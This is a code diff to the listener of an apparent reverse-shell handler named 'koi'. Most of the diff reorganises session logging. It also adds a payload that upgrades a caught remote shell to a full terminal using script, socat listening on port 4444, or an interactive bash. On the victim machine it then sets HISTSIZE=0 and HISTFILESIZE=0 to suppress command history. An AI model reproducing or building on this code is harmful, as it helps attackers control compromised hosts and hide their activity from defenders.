@@ -116,7 +116,7 @@ class Listener:
 
     def _prune(self) -> None:
         for sid in [k for k, s in self._sessions.items() if not s.alive]:
-            self._sessions.pop(sid)
+            self._remove(sid)
 
     def _accept_loop(self):
         while self._running:
@@ -408,9 +408,28 @@ class Listener:
             )
             return
 
+        if sess.id not in self._loggers:
+            from koi.utils.logger import start_logger
+            lg = start_logger(sess)
+            self._loggers[sess.id] = lg
+            sess.log_path = str(lg.path)
+            notify('info', f"Logging to {_gr(lg.path.name)}")
+        logger = self._loggers[sess.id]
+        sess.attach_logger(logger)
+
         with Spinner("Upgrading shell…"):
-            from koi.utils.bash_obfuscate import obfuscated_upgrade_spawn
-            sess.send(obfuscated_upgrade_spawn().encode())
+            pty_payload = (
+                'if command -v script >/dev/null 2>&1; then '
+                    'exec script -qc /bin/bash /dev/null 2>/dev/null || exec script -q /dev/null /bin/bash 2>/dev/null; '
+                'elif command -v socat >/dev/null 2>&1; then '
+                    'exec socat file:$(tty),raw,echo=0 tcp-listen:4444; '
+                'else '
+                    'exec /bin/bash -i 2>/dev/null || exec /bin/sh -i 2>/dev/null; '
+                'fi\n'
+            )
+
+            logger.log_event("upgrade_start")
+            sess.send(pty_payload.encode())
             self._drain(sess, 0.8)
 
             if not sess.alive:
@@ -419,9 +438,12 @@ class Listener:
 
             sess.send(b"export TERM=xterm-256color HISTSIZE=0 HISTFILESIZE=0\n")
             self._drain(sess, 0.3)
+
             self._sync_winsize(sess)
             self._drain(sess, 0.3)
+
             sess.upgraded = True
+            logger.log_event("upgrade_done")
 
         notify('success', f"Shell {_p(f'#{sid}')} upgraded successfully.")
 
@@ -477,18 +499,14 @@ class Listener:
             sys.stdout.write("\033[2J\033[H")
             sys.stdout.flush()
 
-        if sess.id not in self._loggers:
-            from koi.utils.logger import start_logger
-            lg = start_logger(sess)
-            self._loggers[sess.id] = lg
-            sess.log_path = str(lg.path)
-            notify('info', f"Logging to {_gr(lg.path.name)}")
-
         self._in_session = True
         logger = self._loggers.get(sess.id)
-        logger.log_event(f"enter {self._mask_ip(ip)}:{port}")
+        sess.attach_logger(logger)
+        if logger:
+            logger.log_event(f"enter {self._mask_ip(ip)}:{port}")
         reason = interact(sess, logger=logger)
-        logger.log_event(reason)
+        if logger:
+            logger.log_event(reason)
         self._in_session = False
 
         signal.signal(signal.SIGWINCH, signal.SIG_DFL)
@@ -553,22 +571,20 @@ class Listener:
         print()
         old_handler = signal.getsignal(signal.SIGINT)
         signal.signal(signal.SIGINT, lambda *_: (_ for _ in ()).throw(KeyboardInterrupt()))
-        if sess.id not in self._loggers:
-            from koi.utils.logger import start_logger
-            lg = start_logger(sess)
-            self._loggers[sess.id] = lg
-            sess.log_path = str(lg.path)
-        logger = self._loggers[sess.id]
+        logger = self._loggers.get(sess.id)
+        sess.attach_logger(logger)
         try:
             mod = mod_cls(session=sess, args=mod_args, logger=logger)
             mod.run_module()
         except KeyboardInterrupt:
             print()
             notify('warning', "Module interrupted.")
-            logger.log_event(f"module_interrupted  {mod_name}")
+            if logger:
+                logger.log_event(f"module_interrupted  {mod_name}")
         except Exception as exc:
             notify('error', f"Module raised an exception: {exc}")
-            logger.log_event(f"module_error  {mod_name}  {exc}")
+            if logger:
+                logger.log_event(f"module_error  {mod_name}  {exc}")
         finally:
             signal.signal(signal.SIGINT, old_handler)
         print()
